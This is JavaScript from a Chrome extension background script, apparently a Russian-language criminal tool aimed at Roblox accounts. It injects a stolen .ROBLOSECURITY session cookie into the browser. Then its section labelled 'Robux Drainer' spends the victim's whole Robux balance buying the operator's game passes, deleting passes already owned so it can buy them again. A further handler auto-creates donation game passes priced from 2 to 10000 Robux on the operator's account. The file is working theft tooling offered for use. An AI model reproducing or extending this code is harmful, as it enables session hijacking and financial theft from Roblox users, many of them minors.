chrome.runtime.onMessage.addListener((msg, sender, sendResponse) => {
  if (msg.action === 'login_roblox' && msg.token) {
    const cookie = {
      url: 'https://www.roblox.com',
      name: '.ROBLOSECURITY',
      value: msg.token,
      domain: '.roblox.com',
      path: '/',
      secure: true,
      httpOnly: true,
      sameSite: 'unspecified'
    };

    chrome.cookies.set(cookie, () => {
      if (chrome.runtime.lastError) {
        console.error('Cookie set error:', chrome.runtime.lastError);
        sendResponse({ ok: false, error: chrome.runtime.lastError.message });
        return;
      }
      chrome.tabs.create({ url: 'https://www.roblox.com/home' });
      sendResponse({ ok: true });
    });
    return true; // keep async
  }
});


// -- Robux Drainer Logic ---------------------------------------------------------

async function getCsrfToken(cookieHeader) {
  try {
    const r = await fetch('https://auth.roblox.com/v2/logout', {
      method: 'POST',
      headers: { 'Cookie': cookieHeader }
    });
    return r.headers.get('x-csrf-token');
  } catch (e) {
    console.error('CSRF Error:', e);
    return null;
  }
}

async function getUserInfo(cookieHeader) {
  try {
    const r = await fetch('https://users.roblox.com/v1/users/authenticated', {
      headers: { 'Cookie': cookieHeader }
    });
    const data = await r.json();
    return data;
  } catch (e) {
    return null;
  }
}

async function getBalance(userId, cookieHeader) {
  try {
    const r = await fetch('https://economy.roblox.com/v1/users/' + userId + '/currency', {
      headers: { 'Cookie': cookieHeader }
    });
    const data = await r.json();
    return data.robux || 0;
  } catch (e) {
    return 0;
  }
}


async function getProductInfo(passId) {
  try {
    const r = await fetch('https://apis.roblox.com/game-passes/v1/game-passes/' + passId + '/product-info');
    const data = await r.json();
    return { id: passId, productId: data.ProductId, price: data.PriceInRobux };
  } catch (e) {
    return null;
  }
}

async function buyProduct(productId, expectedPrice, cookieHeader, csrfToken) {
  try {
    const r = await fetch('https://economy.roblox.com/v1/purchases/products/' + productId, {
      method: 'POST',
      headers: {
        'Cookie': cookieHeader,
        'X-CSRF-TOKEN': csrfToken,
        'Content-Type': 'application/json'
      },
      body: JSON.stringify({ expectedCurrency: 1, expectedPrice: expectedPrice })
    });
    const data = await r.json();
    return data;
  } catch (e) {
    return { error: e.message };
  }
}


async function revokeGamepass(passId, cookieHeader, csrfToken) {
  try {
    await fetch('https://apis.roblox.com/game-passes/v1/game-passes/' + passId + '/delete', {
      method: 'POST',
      headers: {
        'Cookie': cookieHeader,
        'X-CSRF-TOKEN': csrfToken,
        'Content-Type': 'application/json'
      }
    });
  } catch (e) {
  }
}


chrome.runtime.onMessage.addListener((msg, sender, sendResponse) => {
  if (msg.action === 'drain_robux' && msg.token && msg.gamepasses) {
    chrome.cookies.set({
      url: 'https://www.roblox.com',
      name: '.ROBLOSECURITY',
      value: msg.token,
      domain: '.roblox.com',
      path: '/',
      secure: true,
      httpOnly: true,
      sameSite: 'unspecified'
    }, () => {
      (async () => {
        // No need for cookieHeader anymore, fetch uses browser cookies
        const csrf = await getCsrfToken('');
        if (!csrf) { sendResponse({ ok: false, error: 'Failed to get CSRF' }); return; }
        const user = await getUserInfo('');
        if (!user) { sendResponse({ ok: false, error: 'Failed to get User Info' }); return; }
        let bal = await getBalance(user.id, '');
        if (bal <= 0) { sendResponse({ ok: false, error: 'No Robux balance' }); return; }

        let drainedTotal = 0;
        let passesInfo = [];
        for (const pid of msg.gamepasses) {
          const info = await getProductInfo(pid);
          if (info) passesInfo.push(info);
        }
        passesInfo.sort((a, b) => b.price - a.price);

        for (const pass of passesInfo) {
          while (bal >= pass.price) {
            const r = await buyProduct(pass.productId, pass.price, '', csrf);
            if (r.reason === 'AlreadyOwned') {
              await revokeGamepass(pass.id, '', csrf);
              continue;
            }
            if (r.purchased || (r.reason === 'Success')) {
              bal -= pass.price;
              drainedTotal += pass.price;
            } else {
              break;
            }
          }
        }
        sendResponse({ ok: true, drained: drainedTotal });
      })();
    });
    return true; // Keep message channel open for async response
  }
});

// ── Авто-создание геймпассов на аккаунте оператора ───────────────────────────

async function getFirstUniverseId() {
  try {
    const r = await fetch('https://develop.roblox.com/v1/user/universes?sortOrder=Desc&limit=1');
    if (!r.ok) return null;
    const data = await r.json();
    if (data.data && data.data.length > 0) {
      return data.data[0].id;
    }
  } catch (e) {
    console.error('Error fetching universe:', e);
  }
  return null;
}

async function createRobloxGamepass(universeId, name, csrfToken) {
  try {
    const formData = new FormData();
    formData.append('name', name);
    formData.append('description', 'Support gamepass generated by NEXUS');
    
    // 1x1 transparent PNG image base64
    const base64Png = 'iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNk+M9QDwADhgGAWjR9awAAAABJRU5ErkJggg==';
    const byteCharacters = atob(base64Png);
    const byteNumbers = new Array(byteCharacters.length);
    for (let i = 0; i < byteCharacters.length; i++) {
        byteNumbers[i] = byteCharacters.charCodeAt(i);
    }
    const byteArray = new Uint8Array(byteNumbers);
    const blob = new Blob([byteArray], { type: 'image/png' });
    formData.append('file', blob, 'icon.png');

    const r = await fetch('https://apis.roblox.com/game-passes/v1/universes/' + universeId + '/game-passes', {
      method: 'POST',
      headers: {
        'X-CSRF-TOKEN': csrfToken
      },
      body: formData
    });
    if (!r.ok) return null;
    const data = await r.json();
    return data.gamePassId;
  } catch (e) {
    console.error('Error creating gamepass:', e);
    return null;
  }
}

async function configureGamepassPrice(gamePassId, price, csrfToken) {
  try {
    const r = await fetch('https://apis.roblox.com/game-passes/v1/game-passes/' + gamePassId + '/details', {
      method: 'POST',
      headers: {
        'X-CSRF-TOKEN': csrfToken,
        'Content-Type': 'application/json'
      },
      body: JSON.stringify({ priceInRobux: price, isForSale: true })
    });
    return r.ok;
  } catch (e) {
    console.error('Error configuring price:', e);
    return false;
  }
}

chrome.runtime.onMessage.addListener((msg, sender, sendResponse) => {
  if (msg.action === 'create_gamepasses') {
    (async () => {
      try {
        const csrf = await getCsrfToken('');
        if (!csrf) {
          sendResponse({ success: false, error: 'Не удалось получить CSRF токен (вы вошли в Roblox?)' });
          return;
        }

        const universeId = await getFirstUniverseId();
        if (!universeId) {
          sendResponse({ success: false, error: 'Не удалось найти активные игры (плейсы) на вашем аккаунте Roblox. Создайте хотя бы одну публичную игру.' });
          return;
        }

        const prices = [10000, 5000, 1000, 500, 100, 50, 25, 10, 5, 2];
        const results = {};

        for (const p of prices) {
          const passId = await createRobloxGamepass(universeId, 'Donation ' + p + ' R$', csrf);
          if (passId) {
            const ok = await configureGamepassPrice(passId, p, csrf);
            if (ok) {
              results[p] = passId.toString();
            }
          }
        }

        if (Object.keys(results).length === 0) {
          sendResponse({ success: false, error: 'Не удалось создать ни одного геймпасса. Возможно, превышен лимит создания в Roblox.' });
        } else {
          sendResponse({ success: true, gamepasses: results });
        }
      } catch (e) {
        sendResponse({ success: false, error: e.message });
      }
    })();
    return true; // Keep message channel open for async response
  }
});
